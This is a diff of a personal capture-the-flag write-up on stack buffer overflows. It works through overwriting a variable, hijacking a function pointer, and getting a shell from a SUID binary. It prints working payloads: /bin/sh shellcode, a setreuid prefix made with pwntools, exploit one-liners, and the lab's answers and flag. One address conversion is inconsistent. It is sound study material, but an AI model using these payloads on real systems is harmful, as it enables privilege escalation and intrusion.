@@ -268,7 +268,7 @@ Argument registers	rdi, rsi, rdx, rcx, r8, r9	    Caller
 └───────────────────────────────┘
 ```
 
-## Q1 Task 4: What register stores the return address? Answer: RAX
+### Q1 Task 4: What register stores the return address? Answer: RAX
 
 
 # Task 5: Endianess
@@ -281,7 +281,7 @@ Most Significant Byte (MSB) → 12
 
 Least Significant Byte (LSB) → 78
 
-## Q1 Task 5: No answers required.
+### Q1 Task 5: No answers required.
 
 # Task 6 Overwriting Variables
 
@@ -289,6 +289,7 @@ Least Significant Byte (LSB) → 78
 
 In the program, an integer variable and a character buffer are stored next to each other in memory.
 Because memory is contiguous, writing too much data into the buffer can overwrite the integer variable.
+
 ```
 int main(int argc, char **argv)
 {
@@ -308,6 +309,7 @@ int main(int argc, char **argv)
 ## Memory Alignment
 Compilers often align variables to specific boundaries (like 8 or 16 bytes).
 For example, if a 12‑byte array is allocated on a 16‑byte‑aligned stack, the compiler adds 4 bytes of padding to make it fit neatly.
+
 ```
 | buffer (12 bytes) | padding (4 bytes) |
 ```
@@ -335,6 +337,7 @@ You’ll see that the integer variable’s value changes, demonstrating a buffer
 - Ends with normal warnings nothing of concern.
 
 Using contents first of overflow-1 folder
+
 ```
 overflow-1]$ ls -la
 total 16
@@ -345,12 +348,14 @@ drwx------ 7 user1 user1  169 Nov 27  2019 ..
 ```
 
 Its actually compiled closer look at the file shows its listed as not stripped meaning the debugging information and functions are not removed.
+
 ```
 [user1@ip-10-49-147-85 overflow-1]$ file int-overflow
 int-overflow: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 3.2.0, BuildID[sha1]=847268d010c1aa1403e55a8891fc94d05b7ed123, not stripped
 ```
 
 If not compiled just run with gcc to compile for c code:
+
 ```
  overflow-1]$ gcc int-overflow.c -o int-overflow
 ... Warnings listed but compiles fine.
@@ -378,6 +383,7 @@ Note radare2 and gbd are installed on the attack box for use.
 ```
 
 Next 'afl' to display the functions:
+
 ```
 [0x00400450]> afl
 0x00400450    1 42           entry0
@@ -396,6 +402,7 @@ Next 'afl' to display the functions:
 ```
 
 View code if desired just wanted to see what error was but its just warning.
+
 ```
  overflow-1]$ cat int-overflow.c
 #include <stdlib.h>
@@ -424,31 +431,38 @@ The variable line 'char buffer[14];' pretty much tells me 14 is going to be the 
 15 bytes → Overflow (variable changed)
 
 Example of 14 A's
+
 ```
 [user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
 AAAAAAAAAAAAAA
 Try again?
 ```
+
 What 32
+
 ```
 [user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 You have changed the value of the variable
 Segmentation fault
 ```
+
 Success with 15 A's
+
 ```
 [user1@ip-10-49-129-36 overflow-1]$ ./int-overflow 
 AAAAAAAAAAAAAAA
 You have changed the value of the variable
 ```
 
-## Q1 Task 6: What is the minimum number of characters needed to overwrite the variable? Answer: 15
+### Q1 Task 6: What is the minimum number of characters needed to overwrite the variable? 
+Answer: 15
 
 
 # Task 7 Overwriting Function Pointers
 
 This uses overflow-2 folder, here is part of the C code used on this task:
+
 ```
 overflow-2]$ cat func-pointer.c
 #include <stdlib.h>
@@ -485,10 +499,12 @@ Similar to the example in task 6, data is read into a buffer using the gets func
 Keep in mind that the architecture of this machine is little endian!
 
 First of the endian is right at the start of 'file' command results:
+
 ```
 overflow-2]$ file func-pointer
 func-pointer: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 3.2.0, BuildID[sha1]=4a487843f261c593a102467ecb5ea0f8cbb69b98, not stripped
 ```
+
 LSB = Little Endian 
 
 ## Why does the challenge mention LSB?
@@ -498,6 +514,7 @@ When you overflow the buffer, you replace the bytes of new_ptr with the bytes of
 The CPU expects that address in little‑endian byte order.
 
 ## A closer look at the functions using radare2 in AFL the address of special() is 0x00400567
+
 ```
 overflow-2]$ radare2 func-pointer
  -- I love gradients.
@@ -529,11 +546,13 @@ overflow-2]$ radare2 func-pointer
 0x00400582    1 17           sym.normal
 [0x00400490]> 
 ```
+
 sym.special() located at 0x00400567
 As 8‑byte little‑endian: 67 05 40 00 00 00 00 00
 In a Python string: b"\x67\x05\x40\x00\x00\x00\x00\x00"
 
 Option A – inspect main in radare2
+
 ```
 0x00400470]> pdf @ main
 \u250c 58: int main (int argc, char **argv, char **envp);
@@ -562,11 +581,15 @@ Option A – inspect main in radare2
 \u2514           0x004005e2      c3             ret
 [0x00400470]> 
 ```
+
 From above the line in overflow-2/func-pointer.c code 'volatile int (*new_ptr) () = normal;' resembles 
+
 ```
 0x004005b8      48c745f88205...   mov qword [var_8h], sym.normal
 ```
+
 From the above pdf @ main we get 
+
 ```
 \u2502           ; var char **var_30h @ rbp-0x30     -> argv
 \u2502           ; var int64_t var_24h @ rbp-0x24    -> argc
@@ -589,11 +612,13 @@ special() = 0x00400567
 Little‑endian 8‑byte form: 67 05 40 00 00 00 00 00
 
 So your final payload is:
+
 ```
 python -c 'print("A"*14 + "\x67\x05\x40\x00\x00\x00\x00\x00")' | ./func-pointer
 ```
 
-## Q1 Task 7: Invoke the special function: Answer: You should see: 
+### Q1 Task 7: Invoke the special function: Answer: You should see: 
+
 ```
 [... overflow-2]$ python --version
 Python 2.7.18
@@ -601,6 +626,7 @@ Python 2.7.18
 this is the special function
 you did this, friend!
 ```
+
 What this does is it fills buffer to limit 14 then fills the location of the variable with the location for special() and it runs
 
 
@@ -635,7 +661,8 @@ int main(int argc, char **argv)
 - When any user runs this program, it executes with the permissions of the file’s owner (user2). So user1 temporarily becomes user2 for the duration of program.
 - Idea is to spawn a shell within program t allow secret.txt file to read.
 
-Note the suid bit on bufferoverflow with user2 ownership.
+Note the suid bit on buffer-overflow with user2 ownership.
+
 ```
 overflow-3]$ ls -la
 ...
@@ -646,7 +673,7 @@ overflow-3]$ ls -la
 
 Key points:
 - buffer is 140 bytes.
-- strcpy(buffer, string) copies without length checking.
+- strcpy(buffer, string) copies without length checking. The overflow occurs because strcpy copies user input into var_90h (the buffer at rbp-0x90) without checking length, allowing us to overwrite the saved return address.
 - main method has 2 arguments int argc and char **argv.
 - These will be stored on stack and it wont necessessarily be in order they follow in code. So will need to determine space after the variable we use in over flow.
 
@@ -664,6 +691,7 @@ Goal:
 - Use this to spawn a shell (then read secret.txt via the SUID binary).
 
 ## Normal stack frame for copy_arg (before overflow):
+
 ```
           +---------------------------+
           |       Stack Bottom        |
@@ -681,7 +709,9 @@ Goal:
           +---------------------------+
 Data is written from buffer[0] upwards in memory toward the return address.
 ```
+
 ## After you overflow buffer with shellcode + junk + address:
+
 ```
           +---------------------------------------------+
           |                 Stack Bottom                |
@@ -698,7 +728,9 @@ Data is written from buffer[0] upwards in memory toward the return address.
           +---------------------------------------------+
 When copy_arg returns, it uses the overwritten return address, which now points into your buffer (NOP sled + shellcode).
 ```
+
 ## Your payload in memory (what strcpy writes into buffer and beyond):
+
 ```
 +-------------+-------------+-----------------+
 |  NOP Sled   |  Shellcode  | Return Address  |
@@ -724,6 +756,7 @@ You might structure it like this:
 - The NOP sled doesn’t have to fill the entire buffer — it just needs to be large enough to absorb small address misalignments. 
 - The junk code can be anything and the overwritten part is the address that leads to somewhere in the nop sled that leads to the shell code
 - Where our shell code for this example used is a bash shell in hex:
+
 ```
 "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" 
 ```
@@ -731,13 +764,16 @@ You might structure it like this:
 So the actual Python payload looks like:
 
 Here is form first: 
+
 ```
 python -c "print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)"
 ```
+
 - Where  random_data component = offset_to_saved_rip - len(shellcode) - len(NOPs
 - offset_to_saved_rip = (saved_RIP_address - buffer_start_address)
 
 What it should resemble:
+
 ```
 python -c 'print(
     "\x90" * NOP_COUNT +
@@ -746,6 +782,7 @@ python -c 'print(
     "<return address in little-endian>"
 )' | ./buffer-overflow
 ```
+
 Where:
 
 NOP_COUNT = number of \x90 bytes (e.g. 30, 50, 100…)
@@ -773,31 +810,24 @@ This is how all classic stack‑based shellcode exploits work.
 
 ## example:
 
-NOP_COUNT = 60 "\x90" * 60
-PADDING=58bytes -> "A" * 58
+NOP_COUNT = 100 "\x90" * 100
+PADDING=12 bytes -> "A" * 12
 shellcode = 30 bytes
 <return address> = 8 bytes
 
 ```
-python -c 'print(
-    "\x90" * 60 +
-    "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05" +
-    "A" * 58 +
-    "\xAA\xBB\xCC\xDD\xEE\xFF\x00\x00"  # replace with real little-endian buffer address
-)' | ./buffer-overflow
-
-./buffer-overflow $(python -c "print '\x90'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'")
+overflow-3]$ ./buffer-overflow $(python -c "print '\x90'*100 + '\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\xc0\xe2\xff\xff\xff\x7f\x00\x00'")
 ```
 
 ## That was example but we need to obtain the return address for buffer:
 
 Starting from the overflow-3 folder
 ```
-[user1@ip-10-49-146-85 overflow-3]$ ls
+overflow-3]$ ls
 buffer-overflow    secret.txt
 buffer-overflow.c
 ```
-start the radare on script running:
+start the radare2 on script running:
 ```
 [user1@ip-10-49-146-85 overflow-3]$ radare2 -d ./buffer-overflow
 Process with PID 18104 started...
@@ -838,12 +868,13 @@ Process with PID 18106 started...
 File dbg:///home/user1/overflow-3/buffer-overflow  AAAA reopened in read-write mode
 18106
 [0x7ffff7dd9ef0]> 
-[0x7ffff7dd9ef0]> dc
 ```
+Next dc tells radare2 to continue running the target process until it hits break point
 Now radare2 will stop inside copy_arg.
 
 You should see:
 ```
+[0x7ffff7dd9ef0]> dc
 Here's a program that echo's out your input
 hit breakpoint at: 400527
 [0x00400527]>
@@ -906,41 +937,7 @@ Total:         160 bytes
 [0x00400527]> 
 ```
 
-The relevant lines you showed:
-
-In assembly language from pdf @ sym.copy_arg
-```
-; var int64_t var_98h @ rbp-0x98
-; var int64_t var_90h @ rbp-0x90
-
-0x00400540      488d8570ffff.  lea rax, [var_90h]
-...
-0x0040054d      e8defeffff     call sym.imp.strcpy
-```
-This means:
-
-strcpy destination (buffer) = [rbp-0x90] = var_90h
-
-So buffer starts at var_90h.
-
-2. What is the runtime address of buffer?
-From your afvd:
-
-text
-var var_90h = 0x7fffffffe2d0 = (qword)0x00007ffff7dd0400
-So:
-
-buffer start address = 0x7fffffffe2d0
-
-That’s the value you want to overwrite the return address with (or somewhere into your NOP sled if you adjust).
-
-### Convert that to little‑endian bytes
-Address: 0x7fffffffe2d0
-
-Little‑endian: d0 e2 ff ff ff 7f 00 00
-Python string: "\xc0\xe2\xff\xff\xff\x7f\x00\x00"
-
-### Drop this into your payload and enter as argument to buffer-overflow script:
+## Drop this into your payload and enter as argument to buffer-overflow script:
 ```
 overflow-3]$ ./buffer-overflow $(python -c "print '\x90'*100+'\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05' + 'A'*12 + '\xc0\xe2\xff\xff\xff\x7f\x00\x00'")
 Here's a program that echo's out your input
@@ -951,8 +948,8 @@ sh-4.2$ cat secret.txt
 cat: secret.txt: Permission denied
 sh-4.2$ 
 ```
-Shell word but the suid permissions not carried.
--user1 tested for sudo -l and should have gone through the list of apps to find a vulnerable one but from a view of walkthroughs looks like I reached a similar point others did. So I thought I would try the pwntools options they did. What other did was to generate a prefix to our shellcode to run SETREUID, this is appended so reduce the nop sled accordingly to accomodate the new bytes.
+- Shell word but the suid permissions not carried from user2.
+- user1 tested for sudo -l and should have gone through the list of apps to find a vulnerable one but from a view of walkthroughs looks like I reached a similar point others did. So I thought I would try the pwntools options they did. What other did was to generate a prefix to our shellcode to run SETREUID, this is appended so reduce the nop sled accordingly to accomodate the new bytes.
 
 $ pwn shellcraft -f d amd64.linux.setreuid 1002
 \x31\xff\x66\xbf\xea\x03\x6a\x71\x58\x48\x89\xfe\x0f\x05
@@ -980,3 +977,5 @@ sh-4.2$ cat secret.txt
 omgyoudidthissocool!!
 sh-4.2$ 
 ```
+### Q1 Flag from secret? 
+Answer: omgyoudidthissocool!!
